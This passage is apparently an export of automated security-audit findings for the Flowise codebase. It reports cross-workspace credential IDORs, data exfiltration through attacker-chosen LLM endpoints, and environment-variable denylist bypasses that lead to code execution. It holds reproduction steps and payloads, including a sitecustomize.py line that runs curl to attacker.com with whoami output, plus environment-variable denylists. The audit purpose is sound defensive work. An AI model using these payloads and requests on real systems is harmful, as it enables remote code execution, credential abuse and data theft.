/api/v1/openai-assistants?credential=\u003cworkspace-B-credential-uuid\u003e`\n   - Response: Full list of Workspace B's OpenAI assistants\n4. **Destroy**: `DELETE /api/v1/openai-assistants-vector-store/\u003cany-vector-store-id\u003e?credential=\u003cworkspace-B-credential-uuid\u003e`\n   - Effect: Workspace B's vector store is permanently deleted from OpenAI\n5. **Enumerate files**: `GET /api/v1/openai-assistants/\u003cassistant-id\u003e?credential=\u003cworkspace-B-credential-uuid\u003e`\n   - Response: File IDs and vector store metadata from Workspace B's OpenAI account\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"349e318beab5ee1d70bff2bcb8f69aaa","found_at":"2026-04-13T13:12:09.676754Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":355,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h20","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"openai-assistants-credential-idor","description":"Phase: 10\nSequence: 041\nSlug: openai-assistants-credential-idor\nVerdict: VALID\nRationale: The openai-assistants service fetches Credential entities using only the attacker-supplied credentialId (req.query.credential) without a workspaceId filter, allowing any authenticated user to decrypt and use OpenAI API keys belonging to any other workspace.\nSeverity-Original: HIGH\nPoC-Status: pending\nOrigin-Finding: archon/findings-draft/p8-040-docstore-query-idor-ssrf.md\nOrigin-Pattern: AP-040\n\n## Summary\n\nThree functions in the `openai-assistants` service (`getAllOpenaiAssistants`, `getSingleOpenaiAssistant`, `uploadFilesToAssistant`) accept a `credentialId` from `req.query.credential` and perform a `Credential.findOneBy({ id: credentialId })` query with no `workspaceId` filter. An authenticated attacker who knows or can enumerate a Credential UUID from another workspace can use that workspace's decrypted OpenAI API key to list, read, and upload files to the victim workspace's OpenAI assistant account.\n\n## Location\n\n- Controller: `packages/server/src/controllers/openai-assistants/index.ts:22,44,119` — passes `req.query.credential as string` directly to service with no workspaceId\n- Service: `packages/server/src/services/openai-assistants/index.ts:18-19` (`getAllOpenaiAssistants`) — `findOneBy({ id: credentialId })`\n- Service: `packages/server/src/services/openai-assistants/index.ts:46-47` (`getSingleOpenaiAssistant`) — `findOneBy({ id: credentialId })`\n- Service: `packages/server/src/services/openai-assistants/index.ts:87-88` (`uploadFilesToAssistant`) — `findOneBy({ id: credentialId })`\n- Route: `packages/server/src/routes/openai-assistants/index.ts:10-11` — protected by `checkPermission('assistants:view')` only (no workspace ownership check on credential)\n\n## Attacker Control\n\n1. `req.query.credential` — attacker supplies an arbitrary Credential UUID; no validation against `req.user.activeWorkspaceId`\n2. After the IDOR fetch, `credential.encryptedData` is decrypted and `openAIApiKey` is extracted and used for live OpenAI API calls\n\n## Trust Boundary Crossed\n\nWorkspace A authenticated user reads and operationalizes decrypted API credentials belonging to Workspace B — crossing the workspace isolation boundary. Additionally, the attacker causes the server to make outbound API calls to OpenAI on behalf of the victim's API key (financial and quota impact on victim).\n\n## Impact\n\n- **Cross-workspace credential decryption**: Attacker decrypts and obtains the plaintext `openAIApiKey` of any workspace by providing its Credential UUID\n- **Abuse of victim API key**: Server uses victim's OpenAI key to list all assistants in the victim's account (`getAllOpenaiAssistants`), retrieve specific assistant configurations (`getSingleOpenaiAssistant`), and upload files to the victim's OpenAI assistant (`uploadFilesToAssistant`) — consuming victim's OpenAI quota\n- **Data exfiltration**: All OpenAI assistant configurations and uploaded file metadata in the victim account are returned to the attacker\n\n## Evidence\n\n```typescript\n// controllers/openai-assistants/index.ts:22 — no workspaceId check\nconst apiResponse = await openaiAssistantsService.getAllOpenaiAssistants(req.query.credential as string)\n\n// services/openai-assistants/index.ts:18-19 — no workspaceId filter\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\n    id: credentialId   // attacker-controlled, no workspaceId constraint\n})\n// ...\nconst decryptedCredentialData = await decryptCredentialData(credential.encryptedData)\nconst openAIApiKey = decryptedCredentialData['openAIApiKey']\n// openAIApiKey from victim workspace is now used for live API calls\n```\n\nSibling function `createAssistant` in `packages/server/src/services/assistants/index.ts:57-59` correctly uses `findOneBy({ id: requestBody.credential, workspaceId: workspaceId })`, confirming the omission is an oversight.\n\n## Reproduction Steps\n\n1. Authenticate as User A in Workspace A (must have `assistants:view` permission)\n2. Obtain a Credential UUID from Workspace B (discoverable via other IDOR findings or enumeration)\n3. Send:\n   ```\n   GET /api/v1/openai-assistants?credential=\u003cworkspace-B-credential-uuid\u003e\n   Authorization: Bearer \u003cworkspace-A-token\u003e\n   ```\n4. Observe: Server decrypts Workspace B's OpenAI API key and returns all of Workspace B's OpenAI assistants\n5. Optionally, upload files to Workspace B's OpenAI account:\n   ```\n   POST /api/v1/openai-assistants?credential=\u003cworkspace-B-credential-uuid\u003e\n   (with multipart file upload)\n   ```\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"3f955535334de403cd4f93f4059921f9","found_at":"2026-04-13T13:12:09.676754Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":352,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h17","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"pythonpath-sitecustomize-rce","description":"Phase: 10\nSequence: 021-002\nSlug: pythonpath-sitecustomize-rce\nVerdict: VALID\nRationale: The MCP environment variable denylist omits PYTHONPATH, enabling an authenticated flow editor to inject a sitecustomize.py file via Flowise uploads and then point PYTHONPATH to its directory, achieving arbitrary code execution on every python/python3 MCP server spawn.\nSeverity-Original: HIGH\nPoC-Status: confirmed\nOrigin-Finding: archon/findings-draft/p8-021-npx-package-flag-bypass.md\nOrigin-Pattern: AP-021\n\n## Summary\n\nThe `validateEnvironmentVariables` function (`core.ts:269-281`) maintains a denylist of four environment variables: `['PATH', 'LD_LIBRARY_PATH', 'DYLD_LIBRARY_PATH', 'NODE_OPTIONS']`. The Python interpreter respects many additional environment variables that influence startup execution. Specifically, `PYTHONPATH` causes Python to prepend directories to `sys.path` and — critically — Python automatically imports `sitecustomize` from any directory in `sys.path` at interpreter startup, before executing the target script.\n\nAn authenticated flow editor can:\n1. Upload a file named `sitecustomize.py` to Flowise via any document upload endpoint (chat uploads, document store, etc.).\n2. Configure a `python` or `python3` MCP server with `env: { \"PYTHONPATH\": \"\u003cupload-directory\u003e\" }`.\n3. On next MCP server spawn, Python loads `sitecustomize.py` and executes arbitrary code with Node.js process privileges.\n\nThis attack has been lab-confirmed: `PYTHONPATH=/tmp/evil python3 /dev/null` with `/tmp/evil/sitecustomize.py` containing `os.system(...)` executes the injected command during interpreter startup.\n\n## Location\n\n- `packages/components/nodes/tools/MCP/core.ts:269-281` — `validateEnvironmentVariables` denylist (missing `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONINSPECT`, `PYTHONHOME`, `PYTHONEXECUTABLE`)\n- `packages/components/nodes/tools/MCP/core.ts:382-410` — `validateMCPServerConfig` calls `validateEnvironmentVariables` for the `env` dict\n- `packages/components/nodes/tools/MCP/CustomMCP/CustomMCP.ts:176-182` — validation gate that can be bypassed\n\n## Attacker Control\n\nStep 1 — File upload: The attacker uploads `sitecustomize.py` containing malicious code via any Flowise file-upload endpoint (document store loaders, chat attachment, etc.). The file lands at `~/.flowise/storage/uploads/\u003cchatflowId\u003e/\u003csessionId\u003e/sitecustomize.py` (default path).\n\nStep 2 — MCP config: The attacker configures a CustomMCP node with:\n```json\n{\n  \"command\": \"python3\",\n  \"args\": [\"mcp_server.py\"],\n  \"env\": {\n    \"PYTHONPATH\": \"/home/\u003cuser\u003e/.flowise/storage/uploads/\u003cchatflowId\u003e/\u003csessionId\u003e\"\n  }\n}\n```\n\n`PYTHONPATH` is not in the `dangerousEnvVars` list, so it passes `validateEnvironmentVariables`.\n\n## Trust Boundary Crossed\n\nAuthenticated flow editor configuration + file upload -\u003e Python interpreter startup code execution on host OS. The trust boundary between application-layer MCP configuration and OS-level code execution is crossed. Python's `sitecustomize.py` mechanism provides the code execution primitive with no shell metacharacters required.\n\n## Impact\n\n- Arbitrary code execution on the host OS as the Node.js process user\n- Triggered on every MCP server invocation using `python` or `python3` commands\n- In default Docker deployment: potential root-level access\n- No shell metacharacters or path traversal needed — bypasses `validateCommandInjection` and `validateArgsForLocalFileAccess` entirely\n- Attack works even when `CUSTOM_MCP_SECURITY_CHECK` is enabled (validation passes)\n\n## Evidence\n\n1. `validateEnvironmentVariables` denylist does not include `PYTHONPATH`:\n   ```typescript\n   // core.ts:270\n   const dangerousEnvVars = ['PATH', 'LD_LIBRARY_PATH', 'DYLD_LIBRARY_PATH', 'NODE_OPTIONS']\n   // MISSING: 'PYTHONPATH', 'PYTHONSTARTUP', 'PYTHONINSPECT', 'PYTHONHOME', 'PYTHONEXECUTABLE'\n   ```\n\n2. Lab-confirmed execution on Python 3.11.2:\n   ```bash\n   mkdir -p /tmp/evil \u0026\u0026 echo \"import os; os.system('id \u003e /tmp/pwned')\" \u003e /tmp/evil/sitecustomize.py\n   PYTHONPATH=/tmp/evil python3 /dev/null\n   # Result: /tmp/pwned contains 'uid=999(vigolium) gid=1004(vigolium)'\n   ```\n   The `sitecustomize.py` executed during interpreter startup even when running `/dev/null` as the script.\n\n3. Flowise upload path (default): `~/.flowise/storage/uploads/` — authenticated users can upload files here via document loaders, creating `sitecustomize.py` in an accessible directory.\n\n4. KB bypass table (`knowledge-base-report.md:1047-1050`) does not list PYTHONPATH injection as a known issue, confirming this was not previously documented as an exploitable bypass.\n\n## Reproduction Steps\n\n1. As an authenticated flow editor, upload a file named `sitecustomize.py` with contents:\n   ```python\n   import os\n   os.system('curl https://attacker.com/exfil?data=$(whoami)')\n   ```\n   via any Flowise document upload endpoint.\n\n2. Note the upload path from the Flowise logs (e.g., `/home/node/.flowise/storage/uploads/\u003cchatflowId\u003e/\u003csessionId\u003e/sitecustomize.py`).\n\n3. Create a CustomMCP tool node with the MCP server configuration:\n   ```json\n   {\n     \"command\": \"python3\",\n     \"args\": [\"@modelcontextprotocol/some-mcp-server\"],\n     \"env\": {\n       \"PYTHONPATH\": \"/home/node/.flowise/storage/uploads/\u003cchatflowId\u003e/\u003csessionId\u003e\"\n     }\n   }\n   ```\n\n4. Add the CustomMCP tool to a chatflow and trigger a prediction request.\n\n5. The server executes `python3` with `PYTHONPATH` pointing to the upload directory. Python imports `sitecustomize.py` automatically and executes the attacker's code.\n\n6. Verify by checking for the exfiltration callback or `/tmp/pwned` artifact.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"6840650fe37568b162f56e6136ce406e","found_at":"2026-04-13T13:12:09.676753Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":353,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h18","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"eval-llm-output-exfil","description":"Phase: 10\nSequence: 041-002\nSlug: eval-llm-output-exfil\nVerdict: VALID\nRationale: The evaluation service's LLM evaluator path uses `body.credentialId` (no workspaceId filter) to initialize an LLM node, then sends actual chatflow outputs and expected dataset values to that LLM — an attacker who supplies their own credential UUID pointing to an attacker-controlled endpoint receives all evaluation data.\nSeverity-Original: HIGH\nPoC-Status: pending\nOrigin-Finding: archon/findings-draft/p8-041-docstore-tooldesc-idor-exfil.md\nOrigin-Pattern: AP-040\n\n## Summary\n\nThe `createEvaluation` endpoint (already confirmed as IDOR in p8-047 for credential hijacking) has a second, distinct attack vector matching the p8-041 exfiltration pattern: an attacker supplies their OWN credential UUID — one pointing to an attacker-controlled LLM API endpoint — as `credentialId` in the request body. The `LLMEvaluationRunner.createLLM` then initializes an LLM using that credential and sends all chatflow actual-outputs and expected-outputs (dataset rows) to the attacker's endpoint during LLM-graded evaluation. The p8-047 finding focuses on consuming another workspace's credentials; this variant focuses on the data exfiltration path using the attacker's own credential.\n\n## Location\n\n- Controller: `packages/server/src/controllers/evaluations/index.ts:34` -- passes `body` with attacker-controlled `credentialId` to service\n- Service credential check: `packages/server/src/services/evaluations/index.ts:176-180` -- `Credential.findOneBy({ id: body.credentialId })` with NO workspaceId filter; only checks existence\n- LLM init: `packages/server/src/services/evaluations/LLMEvaluationRunner.ts:53-72` -- `createLLM` builds nodeData using `data.llmConfig.credentialId` directly, calls `newNodeInstance.init(nodeData, undefined, options)`\n- LLM invocation: `packages/server/src/services/evaluations/LLMEvaluationRunner.ts:37-41` -- `llmExecutor.invoke({ question, actualOutput, expectedOutput })` sends real chatflow outputs to LLM\n- Credential resolution: `packages/components/src/utils.ts:668-669` -- `findOneBy({ id: selectedCredentialId })` with NO workspaceId filter\n\n## Attacker Control\n\n1. `body.credentialId` -- attacker supplies UUID of their own credential pointing to attacker-controlled LLM endpoint\n2. `body.llm` -- LLM component node name (e.g., `chatOpenAI`)\n3. `body.model` -- model name\n4. `body.chatflowId` / `body.datasetId` -- workspace-scoped (correct), but evaluation outputs from these are sent to the attacker-controlled endpoint\n\n## Trust Boundary Crossed\n\nChatflow actual outputs and dataset expected outputs (sensitive evaluation data from the attacker's own workspace) cross the server boundary to an attacker-controlled external LLM endpoint. Because `getCredentialData` has no workspaceId filter, an attacker can also supply another workspace's credential UUID to consume victim API quota while their endpoint receives the data.\n\n## Impact\n\n- **Evaluation data exfiltration**: All chatflow actual-output strings and dataset expected-output strings are sent to attacker-controlled LLM endpoint as grader inputs\n- **Cross-workspace credential abuse**: `credentialId` lookup has no workspace filter — attacker can specify any credential UUID from any workspace\n- **No authentication requirement on exfiltration**: Data flows via server-initiated connection using attacker-chosen API key/endpoint\n\n## Evidence\n\n```typescript\n// services/evaluations/index.ts:176-180 -- credential existence check without workspaceId\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\n    id: body.credentialId  // NO workspaceId filter\n})\nif (!credential) throw new Error(`Credential ${body.credentialId} not found`)\n\n// services/evaluations/LLMEvaluationRunner.ts:59-68 -- attacker-controlled credential used to init LLM\nlet nodeData = {\n    inputs: { modelName: data.llmConfig.model },\n    credential: data.llmConfig.credentialId,  // attacker-controlled UUID\n    id: 'llm_0'\n}\nreturn await newNodeInstance.init(nodeData, undefined, options)\n\n// LLMEvaluationRunner.ts:37-41 -- chatflow outputs sent to that LLM\nconst response = await llmExecutor.invoke({\n    question: data.input,\n    actualOutput: actualOutput,    // real chatflow output\n    expectedOutput: data.expectedOutput  // dataset expected value\n})\n```\n\n## Reproduction Steps\n\n1. Authenticate as User A in Workspace A\n2. Set up an attacker-controlled OpenAI-compatible API server that logs all incoming requests\n3. Create a Flowise credential in Workspace A pointing to the attacker-controlled endpoint\n4. POST to `/api/v1/evaluations` with body:\n   ```json\n   {\n     \"evaluationType\": \"llm\",\n     \"credentialId\": \"\u003cattacker-credential-uuid\u003e\",\n     \"llm\": \"chatOpenAI\",\n     \"model\": \"gpt-4o\",\n     \"chatflowId\": \"[\\\"\u003cown-chatflow-uuid\u003e\\\"]\",\n     \"datasetId\": \"\u003cown-dataset-uuid\u003e\",\n     \"selectedLLMEvaluators\": \"[\\\"\u003cevaluator-uuid\u003e\\\"]\"\n   }\n   ```\n5. Observe: the attacker's LLM endpoint receives JSON with `actualOutput` (chatflow LLM responses) and `expectedOutput` (dataset expected answers) for every evaluation row\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"636f7e57efd03004dfd97ec13a9125d9","found_at":"2026-04-13T13:12:09.676753Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":350,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h14","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"public-chatbotconfig-idor","description":"Phase: 8\nSequence: 044\nSlug: public-chatbotconfig-idor\nVerdict: VALID\nRationale: Unauthenticated IDOR exposing private chatflow configuration including system prompts and non-standard auth headers; missing isPublic check confirmed by comparison with correctly-gated sibling endpoint.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe `getSinglePublicChatbotConfig` endpoint queries any chatflow by UUID without checking the `isPublic` flag, exposing private chatflow configurations to unauthenticated callers. While `sanitizeFlowDataForPublicEndpoint` strips credential references and password-typed inputs, it misses system prompts (string-typed), non-standard authentication headers (only 4 header names covered), and flow topology details.\n\n## Location\n\n- Service: `packages/server/src/services/chatflows/index.ts:386-431` -- `ChatFlow.findOneBy({ id: chatflowId })` with no isPublic check\n- Sanitizer: `packages/server/src/utils/sanitizeFlowData.ts:1-69` -- incomplete field coverage\n- Sanitizer header list: `sanitizeFlowData.ts:4` -- only `authorization`, `x-api-key`, `x-auth-token`, `cookie`\n\n## Attacker Control\n\n1. `chatflowId` -- any chatflow UUID (discoverable via enumeration, error messages, or leaked references)\n\n## Trust Boundary Crossed\n\nUnauthenticated external caller accesses private (non-public) chatflow configuration that should only be visible to authenticated workspace members.\n\n## Impact\n\n- **System prompt leakage**: System prompts in chatbotConfig are typed as `string` (not `password`) and pass through the sanitizer, potentially exposing business logic, API keys embedded by users, or sensitive instructions\n- **Non-standard auth header leakage**: Custom headers like `x-functions-key` (Azure), `x-amz-security-token` (AWS STS) pass through the 4-name sanitizer\n- **Flow topology reconnaissance**: Node types, counts, connections, upload configuration, and TTS provider status exposed for any private chatflow\n\n## Evidence\n\n```typescript\n// services/chatflows/index.ts:386-391 -- no isPublic check\nconst getSinglePublicChatbotConfig = async (chatflowId: string) =\u003e {\n    const dbResponse = await appServer.AppDataSource.getRepository(ChatFlow).findOneBy({\n        id: chatflowId  // NO isPublic: true constraint\n    })\n}\n\n// Contrast with getSinglePublicChatflow which correctly checks:\n// if (!chatflow.isPublic) throw new Error(...)\n\n// sanitizeFlowData.ts:4 -- incomplete header coverage\nconst SENSITIVE_HEADER_KEYS = ['authorization', 'x-api-key', 'x-auth-token', 'cookie']\n// Missing: x-functions-key, x-amz-security-token, proxy-authorization, etc.\n```\n\n## Reproduction Steps\n\n1. Obtain any chatflow UUID (including private/non-public chatflows)\n2. GET `/api/v1/public-chatbotConfig/\u003cchatflow-uuid\u003e` -- no authentication required\n3. Observe response contains: chatbotConfig with system prompt text, flow node topology, non-standard auth headers in node configuration, upload settings\n4. Compare with GET `/api/v1/public-chatflows/\u003csame-uuid\u003e` which correctly returns 404 for non-public chatflows\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"fec9f2bb3a30449b3acbc080c37a02f2","found_at":"2026-04-13T13:12:09.676752Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":351,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h16","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"eval-credential-idor","description":"Phase: 8\nSequence: 047\nSlug: eval-credential-idor\nVerdict: VALID\nRationale: Cross-workspace credential access in evaluation service; clear inconsistency with correct pattern in credential service; fix is trivial.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe evaluation service's `createEvaluation` function looks up credentials via `Credential.findOneBy({ id: body.credentialId })` without a `workspaceId` filter. An authenticated user in Workspace A can reference a credential UUID belonging to Workspace B, causing the evaluation to run using Workspace B's API keys. The correct pattern (`{ id, workspaceId }`) is used consistently in the credential service itself.\n\n## Location\n\n- Vulnerable lookup: `packages/server/src/services/evaluations/index.ts:176-178` -- `Credential.findOneBy({ id: body.credentialId })` without workspaceId\n- Correct pattern: `packages/server/src/services/credentials/index.ts` -- consistently uses `{ id, workspaceId }`\n- Protected fields: `stripProtectedFields` strips `id`, `workspaceId`, `organizationId` but NOT `credentialId`\n\n## Attacker Control\n\n1. `body.credentialId` -- attacker provides any credential UUID from any workspace\n\n## Trust Boundary Crossed\n\nWorkspace A user accesses Workspace B's API credentials for evaluation execution, crossing the workspace trust boundary.\n\n## Impact\n\n- **Cross-workspace API credential consumption**: Attacker runs evaluations using victim workspace's OpenAI/Anthropic/etc. API keys, causing financial harm\n- **Third-party service access**: Attacker may access external services under victim's identity\n- **Credential metadata exposure**: Credential entity metadata (name, type) accessible in the evaluation context\n\n## Evidence\n\n```typescript\n// evaluations/index.ts:176-178 -- VULNERABLE\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\n    id: body.credentialId  // NO workspaceId filter\n})\n\n// credentials/index.ts -- CORRECT pattern (for comparison)\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\n    id: credentialId,\n    workspaceId: workspaceId  // Properly filtered\n})\n```\n\n## Reproduction Steps\n\n1. Authenticate as User A in Workspace A\n2. Obtain a credential UUID from Workspace B (via H-00e public config IDOR or other discovery)\n3. POST to `/api/v1/evaluations` with body including:\n   ```json\n   {\n     \"credentialId\": \"\u003cworkspace-B-credential-uuid\u003e\",\n     \"datasetId\": \"\u003cown-dataset-uuid\u003e\",\n     \"llm\": \"chatOpenAI\"\n   }\n   ```\n4. Observe: evaluation runs using Workspace B's API key, consuming their quota\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"07c37f28c29cd9d37d7b2513a5d6d712","found_at":"2026-04-13T13:12:09.676752Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":349,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h13","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"docstore-tooldesc-idor-exfil","description":"Phase: 8\nSequence: 041\nSlug: docstore-tooldesc-idor-exfil\nVerdict: VALID\nRationale: Cross-workspace document chunk exfiltration via attacker-controlled LLM endpoint; no blocking protection found; architectural gap (no workspaceId on DocumentStoreFileChunk) confirms design-level vulnerability.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe `generateDocStoreToolDesc` endpoint allows an authenticated user to exfiltrate document chunks from any workspace's document store by providing a cross-workspace `storeId` and an attacker-controlled `selectedChatModel` configuration. The victim's document chunks are sent to the attacker's LLM API endpoint for tool description generation, exposing their content.\n\n## Location\n\n- Controller: `packages/server/src/controllers/documentstore/index.ts:697-709` -- no workspaceId passed to service\n- Service: `packages/server/src/services/documentstore/index.ts:2138-2194` -- `DocumentStoreFileChunk.findBy({ storeId: docStoreId })` with no workspace filter\n- LLM init: `services/documentstore/index.ts:2162-2182` -- attacker-controlled credential and inputs used to initialize LLM node\n\n## Attacker Control\n\n1. `docStoreId` (via URL param) -- any DocumentStore UUID from any workspace\n2. `selectedChatModel.name` -- any registered LLM component node name\n3. `selectedChatModel.credential` -- attacker's own credential UUID pointing to their LLM API key\n4. `selectedChatModel.inputs` -- arbitrary LLM configuration including model name and endpoint\n\n## Trust Boundary Crossed\n\nWorkspace A user reads Workspace B document chunks. Document content crosses from server to attacker-controlled external LLM endpoint.\n\n## Impact\n\n- **Cross-workspace document content exfiltration**: Victim's indexed document chunks (pageContent) sent to attacker-controlled LLM endpoint\n- **Credential boundary bypass**: Attacker uses their own LLM credentials to process victim's data, viewing content via API usage logs\n- **No audit trail**: The request appears as a legitimate tool description generation from the attacker's workspace\n\n## Evidence\n\n```typescript\n// services/documentstore/index.ts:2143 -- no workspace filter\nconst chunks = await appServer.AppDataSource.getRepository(DocumentStoreFileChunk).findBy({\n    storeId: docStoreId\n})\n\n// services/documentstore/index.ts:2162-2182 -- attacker-controlled LLM\nconst nodeData = {\n    credential: selectedChatModel.credential,  // attacker's credential\n    inputs: selectedChatModel.inputs,           // attacker's config\n    id: `${selectedChatModel.name}_0`\n}\nconst response = await llmNodeInstance.invoke(\n    DOCUMENTSTORE_TOOL_DESCRIPTION_PROMPT_GENERATOR.replace('{context}', chunksPageContent)\n)\n```\n\n## Reproduction Steps\n\n1. Authenticate as User A in Workspace A\n2. Create a credential pointing to attacker-controlled OpenAI-compatible API endpoint\n3. POST to `/api/v1/document-store/generate-tool-desc/\u003cworkspace-B-store-uuid\u003e` with body:\n   ```json\n   {\n     \"selectedChatModel\": {\n       \"name\": \"chatOpenAI\",\n       \"credential\": \"\u003cattacker-credential-uuid\u003e\",\n       \"inputs\": { \"modelName\": \"gpt-4o\" }\n     }\n   }\n   ```\n4. Observe: victim's document chunks sent to attacker's LLM endpoint as context in the prompt\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"7727965c3e0c819f3edd64dc12a098e8","found_at":"2026-04-13T13:12:09.676751Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":347,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h9","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"mcp-env-ld-preload-bypass","description":"Phase: 8\nSequence: 023\nSlug: mcp-env-ld-preload-bypass\nVerdict: VALID\nRationale: The MCP environment variable denylist blocks LD_LIBRARY_PATH but omits the more dangerous LD_PRELOAD (which overrides the dynamic linker to load arbitrary shared objects), enabling shared library injection into MCP subprocesses by an authenticated flow editor.\nSeverity-Original: HIGH\nPoC-Status: theoretical\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-02/debate.md\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: The denylist at core.ts:270 demonstrably omits LD_PRELOAD while blocking the less-dangerous LD_LIBRARY_PATH, and the code path to subprocess spawn has no other interception point for this variable.\nSeverity-Final: MEDIUM\nPoC-Status: theoretical\n\n## Summary\n\nThe `validateEnvironmentVariables` function in MCP core.ts maintains a denylist of dangerous environment variables: `['PATH', 'LD_LIBRARY_PATH', 'DYLD_LIBRARY_PATH', 'NODE_OPTIONS']`. This denylist omits `LD_PRELOAD`, which instructs the Linux dynamic linker to load arbitrary shared objects before any other library. An authenticated flow editor can configure a CustomMCP tool with `{ env: { \"LD_PRELOAD\": \"/tmp/evil.so\" } }`, causing the MCP subprocess to load a malicious shared library. Also missing: `PYTHONPATH`, `PERL5LIB`, `RUBYLIB`, `LD_AUDIT`, `GCONV_PATH`.\n\n## Location\n\n- `packages/components/nodes/tools/MCP/core.ts:269-281` -- `validateEnvironmentVariables` function\n- `packages/components/nodes/tools/MCP/core.ts:270` -- denylist array\n\n## Attacker Control\n\nThe attacker controls the `env` field in the MCP server configuration via the flow editor UI. The LD_PRELOAD value is a filesystem path to a shared object (.so) file. The env values pass through `validateEnvironmentVariables` without any transformation.\n\n## Trust Boundary Crossed\n\nAuthenticated flow editor configuration -\u003e dynamic linker behavior of MCP subprocess. The trust boundary is between application-level environment configuration and OS-level process loading behavior.\n\n## Impact\n\n- Shared library injection into any MCP subprocess (LD_PRELOAD)\n- Arbitrary code execution within the MCP subprocess context\n- Python module injection via PYTHONPATH (lower prerequisite bar than LD_PRELOAD)\n- Prerequisite: attacker must have a write primitive to place the .so file on the filesystem (achievable via H-03/p8-022 df.to_csv or other file write vulnerabilities)\n\n## Evidence\n\n1. Denylist is missing LD_PRELOAD:\n   ```typescript\n   // core.ts:269-270\n   const dangerousEnvVars = ['PATH', 'LD_LIBRARY_PATH', 'DYLD_LIBRARY_PATH', 'NODE_OPTIONS']\n   ```\n\n2. LD_PRELOAD is not checked anywhere else in the validation pipeline.\n\n3. Spec Gap 9 independently identified LD_PRELOAD as missing from the denylist.\n\n4. The denylist blocks LD_LIBRARY_PATH (changes library search path) but not LD_PRELOAD (forces specific library loading), which is strictly more dangerous.\n\n## Reproduction Steps\n\n1. First, establish a write primitive (e.g., via p8-022 Pyodide df.to_csv bypass) to write a malicious shared object to `/tmp/evil.so`.\n2. As an authenticated flow editor, create a CustomMCP tool with:\n   ```json\n   {\n     \"command\": \"python3\",\n     \"args\": [\"mcp_server.py\"],\n     \"env\": { \"LD_PRELOAD\": \"/tmp/evil.so\" }\n   }\n   ```\n3. The MCP subprocess will load evil.so via the dynamic linker before executing the command.\n4. The .so file's constructor function executes with the subprocess's privileges.\n5. For PYTHONPATH (lower bar): write a malicious Python module to /tmp, then set `\"PYTHONPATH\": \"/tmp\"` in MCP env. Any `import` in the MCP server script will load the attacker's module first.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"1de1e341dee4575fa3b0c6202767e808","found_at":"2026-04-13T13:12:09.67675Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":348,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h11","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"docstore-query-idor-ssrf","description":"Phase: 8\nSequence: 040\nSlug: docstore-query-idor-ssrf\nVerdict: VALID\nRationale: Confirmed cross-workspace IDOR with SSRF amplification via attacker-controlled config merge; no blocking protection found; workspace filter exists 